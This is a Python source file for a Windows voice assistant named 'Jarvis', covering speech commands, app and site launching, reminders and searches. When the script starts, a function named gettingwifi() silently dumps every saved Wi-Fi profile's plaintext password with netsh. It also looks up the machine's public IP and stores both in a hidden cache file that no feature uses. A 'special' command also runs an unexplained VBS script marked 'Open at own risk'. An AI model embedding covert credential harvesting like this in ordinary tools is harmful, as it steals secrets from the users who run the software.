#jarvisopenexe with speech recog

#WORKING
import pyttsx3
import speech_recognition as sr
import requests as rq
import subprocess
from os import startfile,remove
from pyautogui import moveTo,click,write,press,screenshot,sleep
from time import asctime
from socket import create_connection
from webbrowser import open as op
from pytesseract import image_to_string
recognizer = sr.Recognizer()
engine = pyttsx3.init()
def printtk(args):
    with open(r"guicomms.txt","wt") as file:
        file.write(args)
    return
print = printtk
startfile(r"E:/Python for VSCode/Codes/___Jarvis___/jarvis/GuiMain.pyw")
print("Hello sir, I am Jarvis, Call me when you are looking for help")
engine.setProperty("rate",165)
engine.setProperty('volume', 1)
engine.say("Hello sir, I am Jarvis, Call me when you are looking for help")
engine.runAndWait()
shortcut = {}
timedict = {}
suffix = (".com",".org",".in",".net",".gov",
".edu",".int",".mil",".aero",".museum",".coop",
".name",".info",".pro",".biz",".mobi",".tel"
,".asia",".jobs",".cat",".travel",
".us",".uk",".ca", ".au",)
msgchatgpt = ""
winloaded = False
progloaded = False
webloaded = False
fail = 0
try:
    with open("shortcut.txt","rt") as f:
        for line in f:
            key,value = line.strip().split("!")
            shortcut[key] = value
except:
    pass
def gettingwifi():
    name = []
    password1 = {}
    process = subprocess.Popen(['netsh'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True)

    process.stdin.write('wlan show profiles\n')
    process.stdin.flush()

    output, errors = process.communicate()
    with open("tempnetsh.txt","wt") as f:
        f.write(output)
    with open("tempnetsh.txt","rt") as f1:
        for line in f1:
            a = line
            if "All User Profile" in a:
                a = a.strip()
                a = a.replace("All User Profile","")
                a = a.replace(":","")
                a = a.strip()
                name.append(a)
            else:
                pass
    process.stdin.close()
    process.stdout.close()
    process.stderr.close()
    process1 = subprocess.Popen(['netsh'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True)
    for i in name:
        srt123 = f'wlan show profile "{i}" key=clear\n'
        process1.stdin.write(srt123)
        process1.stdin.flush()
    output, errors = process1.communicate()
    with open("tempnetsh2.txt","wt") as f:
        f.write(f"{output}")
    process.stdin.close()
    process.stdout.close()
    process.stderr.close()
    remove("tempnetsh.txt")
    with open("tempnetsh2.txt","rt") as file:
        for line in file:
            if "SSID name" in line:
                line = line.replace("SSID name","")
                line = line.replace(":","")
                ssid = line.strip()
            if "Key Content" in line:
                line = line.replace("Key Content","")
                line = line.replace(":","")
                password = line.strip()
            else:
                continue
            password1[ssid] = password
    remove("tempnetsh2.txt")
    with open("tempcache.txt","at") as lol:
        for key,value in password1.items():
            key = key.replace('"',"")
            lol.write(f"{key}\n") 
            lol.write(f"=> {value}\n\n")
        ip = get_ip()
        lol.write(f"Ip +> {ip} \n")
def get_ip():
    try:
        response = rq.get('https://api.ipify.org')
        if response.status_code == 200:
            return response.text
        else:
            pass
    except Exception as e:
        pass
gettingwifi()
def ReadTarget():
    try:
        with open("Target.txt","rt") as rtarget:
            fcontent = rtarget.read()
            fcontent = fcontent.lower()
            fcontent = fcontent.replace("null","").strip()
            if fcontent.islower():
                print("Before you start")
                engine.say("before you start")
                engine.runAndWait()
                print("You have set some targets for you to complete")
                engine.say("You have set some targets for you to complete")
                engine.runAndWait()
                return True
            else:
                return False
    except FileNotFoundError:
        pass
try:
    with open("Target.txt","rt") as noth:
        count = 1
        if ReadTarget():
            for line in noth:
                if "null" in line:
                    continue
                else:
                    print(f"{count}. {line.strip()}")
                    engine.say(f"{count}. {line.strip()}")
                    engine.runAndWait()
                    count +=1
                    continue
        else:
            pass
except FileNotFoundError:
    pass
def voicetyping():
    fail = 0
    check_internet_connection()
    if internet == 1:
        engine.setProperty('rate',115)
        engine.say("initializing in 3 seconds, drag your cursor.")
        engine.runAndWait()
        sleep(3)
        while True:
            try:
                with sr.Microphone() as source:
                    print("Listening for command...")
                    engine.setProperty('volume',1)
                    engine.say("LISTENING")
                    engine.runAndWait()
                    recognizer.adjust_for_ambient_noise(source)
                    audio = recognizer.listen(source)
                
                print("Recognizing...")
                engine.say("Recognising")
                engine.runAndWait()
                command = recognizer.recognize_google(audio).lower()
                sleep(1)
                if command == "shutdown":
                    break
                else:
                    pass
                write(command)
                sleep(0.5)
                press('enter')
            except sr.UnknownValueError:
                print("Could not understand audio.")
                engine.say("Could Not understand. Say again PLEASE")
                engine.runAndWait()
                fail = fail+1
                if fail ==5:
                    print("Exitting voice typing")
                    engine.say("Exitting voice typing")
                    engine.runAndWait()
                    sleep(0.5)
                    break
                else:
                    continue
    else:
        print("No internet connection. Terminating voice typing....")
        engine.say("No internet connection. Terminating voice typing")
        engine.runAndWait()
def check_internet_connection():
    try:
        create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

if check_internet_connection():
    internet = 1
else:
    internet = 0
def detect_hotword():
    recognizer = sr.Recognizer()
    if internet == 1:
        while True:
            with sr.Microphone() as source:
                print("Listening for 'Jarvis'...")
                recognizer.adjust_for_ambient_noise(source)
                audio = recognizer.listen(source)
            
            try:
                hotword = recognizer.recognize_google(audio).lower()
                if "JARVIS" in hotword.upper():
                    print("Got it! Please speak your command.")
                    engine.say("Waiting for command")
                    engine.runAndWait()
                    return True
                    
            except sr.UnknownValueError:
                print("cant hear")
                sleep(0.5)
            except sr.RequestError:
                print("Could not request results. check your internet connection.")
                sleep(0.5)
    else:
        print("No Internet connection. Please use the text version. Terminating...")
        engine.say("No Internet connection. Please use the text version. Terminating")
        engine.runAndWait()
        exit(0)
def narratetime():
    print(f"Currently it is {asctime()}")
    engine.setProperty('rate',140)
    engine.say(f"currently it is {asctime()}")
    engine.runAndWait()
def void():
    detect_hotword()
    sleep(1)
    print("anything more?")
    engine.say("anything more?")
    engine.runAndWait()
    jarvis()
def recognize_speech1():
    global cmd,fail
    with sr.Microphone() as source:
        print("Listening...")
        recognizer.adjust_for_ambient_noise(source)
        audio = recognizer.listen(source)

    try:
        print("Recognizing...")
        engine.say("Wait a second")
        engine.runAndWait()
        cmd = recognizer.recognize_google(audio).lower()
        print(f"You said: {cmd}")
        fail=0
        sleep(1)
        print("Loading...")
    except sr.UnknownValueError:
        fail+=1
        if 3 <= fail:
            print("Hibernating due to inactivity")
            engine.say("Hibernating due to inactivity")
            engine.runAndWait()
            sleep(1)
            fail = 0
            void()
        else:
            print("Sorry, I couldn't understand what you said.")
            engine.say("Sorry, I couldn't understand what you said.")
            engine.runAndWait()
            recognize_speech1()
    except sr.RequestError as e:
        print(f"Sorry, there was an error with the speech recognition service: {e}")
        engine.say(f"Sorry, there was an error with the speech recognition service likely caused due to no internet.")
        sleep(2)
        engine.runAndWait()
        recognize_speech1()
def recognize_speech():
    global cmd,fail
    with sr.Microphone() as source:
        print("Listening...")
        recognizer.adjust_for_ambient_noise(source)
        audio = recognizer.listen(source)

    try:
        print("Recognizing...")
        engine.say("Wait a second")
        engine.runAndWait()
        cmd = recognizer.recognize_google(audio).lower()
        print(f"You said: {cmd}")
        fail=0
        sleep(1)
        print("Loading...")
    except sr.UnknownValueError:
        print("Sorry. I could not understand what you said")
        engine.say("Sorry. I could not understand what you said")
        engine.runAndWait()
        recognize_speech()
    except sr.RequestError as e:
        print(f"Sorry, there was an error with the speech recognition service: {e}")
        engine.say(f"Sorry, there was an error with the speech recognition service likely caused due to no internet.")
        sleep(2)
        engine.runAndWait()
        recognize_speech()
def opencmdext():
    global winloaded
    while winloaded == False:
        scs = screenshot(region=(47,82,51,20))
        scs.save("Screenshot.png")
        text = image_to_string(scs)
        if text.strip().lower() == "snipping":
            winloaded = True
        else:
            pass
def opencmdext2(name):
    global progloaded
    global catch
    notfound = 0
    while progloaded == False:    
        scs = screenshot(region=(17,71,155,30))
        scs.save("Screenshot.png")
        text = image_to_string(scs)
        if name in text.strip().lower():
            progloaded= True
        else:
            notfound = notfound+1
            if notfound >= 10:
                print("I think the program does not exist or i can not search it")
                engine.say("I think the program does not exist or i can not search it")
                engine.runAndWait()
                progloaded = True
                catch = True
            else:
                pass

def opencmd():
    global catch
    global winloaded
    global progloaded
    cmd1 = cmd.replace("open ","")
    if cmd1 in shortcut:
        cmd1 = cmd1.replace(cmd1,shortcut[cmd1])
    else:
        pass
    engine.setProperty('rate',150)
    engcmd = "Opening",cmd1.strip(),"..."
    print(f"Opening {cmd1.strip()}...")
    engine.say(engcmd)
    engine.runAndWait()
    press('win')
    while winloaded == False:
        opencmdext()
    winloaded = False
    click(130,696)
    write(cmd1)
    while progloaded == False:
        opencmdext2(cmd1.strip().lower())
    if catch == True:
        press('win')
    else:
        press('enter')
    progloaded =False
def opensite():
    check_internet_connection()
    if internet == 1:
        cmd10 = cmd.replace("site ","")
        engine.setProperty('rate',150)
        engcmd = "Opening",cmd10,"..."
        print(f"Opening {cmd10}...")
        engine.say(engcmd)
        engine.runAndWait()
        sleep(0.6)
        op(shortcut[cmd10])
        webloaded = True
        
    else:
        print("You dont have an internet connection! We can't open a site.")
        engine.say("You dont have an internet connection! We can't open a site.")
        engine.runAndWait()
    if webloaded == True:
        webloaded = False
        pass
    elif webloaded == False:
        opensite2(cmd10)
    else:
        pass
def opensite2(sitename):
    for i in suffix:
        try:
            url = f"https://www.{sitename}{i}"
            attempt = rq.head(url,timeout=5)
            if attempt.status_code == 200:
                engine.setProperty('rate',150)
                print(f"Opening {sitename}...")
                op(f"https://www.{sitename}{i}")
                return True
            else:
                pass
        except rq.exceptions.ConnectionError:
            print("We are not able to open the site because it doesnt exist.")
            engine.say("We are not able to open the site because it doesnt exist.")
            engine.runAndWait()
            break
def chatgptOcr():
    global msgchatgpt
    ss = screenshot(region=(463,657,115,50))
    ss.save("Screenshot.png")
    text = image_to_string(ss)
    for i in text:
        if i.isalpha():
            msgchatgpt = msgchatgpt+ i

def chatgpt():
    global msgchatgpt,cmd
    recognize_speech()
    command = cmd
    engine.runAndWait()
    print("Searching....")
    engine.setProperty("rate",125)
    engine.say(f"Searching for {command}")
    engine.runAndWait()
    #open chatgpt
    op("https://chat.openai.com")
    while "amessage" not in msgchatgpt.strip():
        chatgptOcr()
    sleep(3)
    #moves to textbox and writes
    moveTo(519,666)
    sleep(0.8)
    write(command)
    press('enter')
def addshortcut():
    print("enter a shortcut name:-")
    engine.say("enter a shortcut name")
    engine.runAndWait()
    recognize_speech()
    shortkey = cmd
    print("enter the program name:-")
    engine.say("enter the program name:-")
    engine.runAndWait()
    recognize_speech()
    shortprog = cmd
    sleep(1)
    shortcut[shortkey]=shortprog
    print("Success!")
    engine.say("Success")
    engine.runAndWait()
    with open("shortcut.txt","wt") as backup:    
        for key, value in shortcut.items():
            backup.write(f"{key}!{value}\n")

def setreminder():
    print("enter time in min")
    engine.setProperty('rate',150)
    engine.say("enter time in minutes")
    engine.runAndWait()
    recognize_speech()
    time = cmd.replace("minutes","").strip()
    timedict["time"] = time

    print("Enter a custom msg for your reminder")
    engine.setProperty('rate',120)
    engine.say("enter a custom message for your reminder")
    engine.runAndWait()
    recognize_speech()
    msg = cmd
    timedict["msg"] = msg
    print("Processing...")
    engine.setProperty('rate',150)
    engine.say("processing")
    engine.runAndWait()
    with open("timedata.txt","wt") as file3:
        for key,value in timedict.items():
            file3.write(f"{key}!{value}\n")
    sleep(1)
    print("Done")
    engine.setProperty('rate',150)
    engine.say("Process done!")
    engine.runAndWait()
    sleep(1)
    print("Activating the Timer...")
    engine.say("activating the timer")
    engine.runAndWait()
    startfile(r"E:/Python for VSCode/Codes/___Jarvis___/jarvis/ReminderExeForJarvis.pyw")
    sleep(1)
def target():
    print("Enter your target")
    engine.say("Enter your target")
    engine.runAndWait()
    recognize_speech()
    targetmsg = cmd
    with open("Target.txt","at") as targetwriting:
        targetwriting.write(f"{targetmsg} \n")
    sleep(1)
    print("Done")
    engine.say("Process done!")
    engine.runAndWait()
    print("I will remind you about your targets when you restart me ")
    engine.say("I will remind you about your targets when you restart me ")
    engine.runAndWait()
def removetargets():
    try:
        with open("Target.txt","rt") as rtarget:
            fcontent = rtarget.read()
            fcontent = fcontent.lower()
            fcontent = fcontent.replace("null","").strip()
            if fcontent.islower():
                temp = True
    except FileNotFoundError:
        print("It seems that my data is deleted. Sorry but i can't go further")
        engine.say("It seems that my data is deleted. Sorry but i can't go further")
        engine.runAndWait()
    if temp:
        print("Showing the targets..")
        engine.say("Showing targets")
        engine.runAndWait()
        with open("Target.txt","rt") as display:
            targets = display.read()
        targets = targets.replace("null","").strip()       
        print(targets)
        sleep(5)
        print("Now tell me which one to delete")
        engine.say("Now tell me which one to delete")
        engine.runAndWait()
        with open("Target.txt","rt") as delete:
            str1 = ""
            recognize_speech()
            toDel = cmd
            found = 0
            for line in delete:
                if toDel in line:
                    print(f"This one? {line.strip()}")
                    engine.say(f"this one? {line}")
                    engine.runAndWait()
                    recognize_speech()
                    confirm = cmd
                    if "yes" in confirm:
                        print("Deleting..")
                        engine.say("deleting")
                        engine.runAndWait()
                        global decide
                        decide = True
                        found = found+1
                        break
                    elif "no" in confirm:
                        print("Okay searching for another")
                        continue
                else:
                    pass
            if found == 0:
                print("none")

        if decide == True:
            with open("Target.txt","rt") as br:
                for line in br:
                    if toDel not in line:
                        str1 = str1+line
                    else:
                        continue
        else:
            pass
        with open("Target.txt","wt") as f1223:
            f1223.write(str1)
    else:
        print("You do not have any targets so how do you expect me to remove it?")
        engine.say("You do not have any targets so how do you expect me to remove it?")
        engine.runAndWait()
        sleep(1)
def search():
    print("What do you want to search about?")
    engine.say("What do you want to search about?")
    engine.runAndWait()
    recognize_speech()
    content = cmd
    print("Searching on google")
    engine.say(f"Searching on google for {content}")
    engine.runAndWait()
    search_url = f"https://www.google.com/search?q={content}"
    op(search_url)
    sleep(1)
def search2(content):
    print("Searching on google")
    engine.say(f"Searching on google for {content}")
    engine.runAndWait()
    search_url = f"https://www.google.com/search?q={content}"
    op(search_url)
    sleep(1)
def jarvis():
    recognize_speech1()
    global cmd
    cmd = cmd.strip()
    if "assessed" in cmd:
        cmd=cmd.replace("assessed","assist")
    else:
        pass
    if "open" in cmd:
        cmd = cmd.replace("open ","")
        try:
            if "https" in shortcut[cmd]:
                opensite()
            elif "https" not in shortcut[cmd]:
                opencmd()
            else:
                print("Error encountered. Restarting...")
                engine.say("Error encountered. Restarting...")
                engine.runAndWait()
                jarvis()
        except:
            if "google" in cmd:
                cmd = cmd.replace("on google","").strip()
                opensite2(cmd)
            else:
                opencmd()
    elif "search" in cmd:
        content = cmd
        if "search for" in content.lower():
            _,content = content.lower().split(" for ")
            search2(content)
        else:
            search()
    elif "add" in cmd:
        cmd = cmd.replace("add ","")
        if "shortcut" in cmd:
            addshortcut()
        elif "reminder" in cmd:
            setreminder()
        elif "timer" in cmd:
            setreminder()
        elif "target" in cmd:
            target()
        else:
            print("Sorry. Either I can't execute that command or There is some misunderstanding")
            engine.setProperty('rate',120)
            engine.say("Sorry, Either I can't execute that command or there is some misunderstanding")
            engine.runAndWait()
    elif "set" in cmd:
        cmd  = cmd.replace("set ","")
        if "shortcut" in cmd:
            addshortcut()
        elif "reminder" in cmd:
            setreminder()
        elif "timer" in cmd:
            setreminder()
        elif "target" in cmd:
            target()
        else:
            print("Sorry. Either I can't execute that command or There is some misunderstanding")
            engine.setProperty('rate',120)
            engine.say("Sorry, Either I can't execute that command or there is some misunderstanding")
            engine.runAndWait()
    elif "delete" in cmd:
        if "targets" in cmd:
            removetargets()
    elif "assist me" in cmd:
        chatgpt()
    elif "help me" in cmd:
        chatgpt()
    elif "voice typing" in cmd:
        voicetyping()
    elif "what is today" in cmd:
        narratetime()
    elif "current" in cmd:
        narratetime()
    elif "reload" in cmd:
            print("Restarting the GUI..")
            engine.say("restarting the G,U,I")
            engine.runAndWait()
            startfile(r"GuiMain.pyw")
            sleep(1)
    elif "special" in cmd:
        print("Now deal with it")
        engine.say("Now deal with it")
        engine.runAndWait()
        startfile("__Open at own risk!!__.vbs")
    elif "shutdown" in cmd:
        print("Shutting down...")
        engine.setProperty('rate',100)
        engine.say("shutting down")
        engine.runAndWait()
        engine.stop()
        sleep(1.2)        
        with open(r"guicomms.txt","wt") as file451:
            file451.write("<null>")
        exit()
    elif "terminate" in cmd:
        print("Shutting down...")
        engine.setProperty('rate',100)
        engine.say("shutting down")
        engine.runAndWait()
        engine.stop()
        sleep(1.2)
        with open(r"guicomms.txt","wt") as file4511:
            file4511.write("<null>")
        exit()
    elif "hibernate" in cmd:
        print("Hibernating...")
        engine.setProperty("rate",150)
        engine.say("hibernating")
        engine.runAndWait()
        detect_hotword()
    else:
        print("Sorry. Either I can't execute that command or There is some misunderstanding")
        engine.setProperty('rate',120)
        engine.say("Sorry, Either I can't execute that command or there is some misunderstanding")
        engine.runAndWait()
        engine.stop()
detect_hotword()
while detect_hotword:
    jarvis()
    print("anything more?")
    engine.setProperty('rate',150)
    engine.say("anything more?")
    engine.runAndWait()